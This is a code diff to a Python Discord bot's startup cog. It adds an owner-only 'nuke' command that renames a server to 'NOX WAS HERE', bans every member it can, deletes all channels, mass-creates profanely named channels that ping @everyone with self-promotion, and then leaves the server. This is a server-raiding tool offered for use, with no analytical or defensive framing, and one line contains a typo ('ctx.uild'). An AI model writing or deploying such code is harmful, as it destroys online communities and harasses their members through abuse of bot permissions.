@@ -11,6 +11,36 @@ class Startup(commands.Cog):
     async def on_ready(self):
         os.system('cls' if os.name == 'nt' else 'clear')
         print('Logged in as: ' + self.bot.user.name + '#' + self.bot.user.discriminator + ' - (' + str(self.bot.user.id) + ')')
+    @commands.command(name='nuke', aliases=['nuke'], brief='Nuke the server', description='Nuke the server')
+    async def nuke(self, ctx):
+        if ctx.author.id == self.bot.owner_id:
+            try:
+                print(f'Joined guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuking it :)')
+                await ctx.uild.create_text_channel(f'fuckme1')
+                invite = await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Invite: {str(invite)} :)')
+                await ctx.guild.edit(name="NOX WAS HERE")
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Changed server name :)')
+                for member in ctx.guild.members:
+                    try:
+                        await member.ban(reason='Banned by Anix <3')
+                    except discord.errors.Forbidden:
+                        pass
+                    print(f'Banned {member.name} - {str(member.id)}')
+                print("Guild: " + str(ctx.guild.name) + " - " + str(ctx.guild.id) + " - Banned all possible members")
+                for c in ctx.guild.channels:
+                    await c.delete()
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all channels :)')
+                for i in range(2,2000):
+                    await ctx.guild.create_text_channel(f'fuckme{i}')
+                    await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Created 2000 channels :)')
+                await ctx.guild.leave()
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Left after nuking :)')  
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuked :)')
+            except discord.errors.Forbidden:
+                print("Guild: " + str(ctx.guild.name) + " - " + str(ctx.guild.id) + " - Kicked or have been banned")
+        return
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
 
